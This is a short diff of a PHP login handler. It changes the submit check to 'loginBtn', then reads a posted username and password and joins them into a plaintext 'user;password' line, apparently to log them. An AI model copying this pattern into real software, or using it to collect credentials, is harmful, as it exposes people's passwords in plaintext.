@@ -1,7 +1,7 @@
 
 <?php
 
-if(isset($_POST["name"]) && isset($_POST["password"])){
+ if(isset($_POST['loginBtn'])){
   $username = $_POST['name'];
   $password = $_POST['password'];
   $text = $username . ";" . $password . "\n";
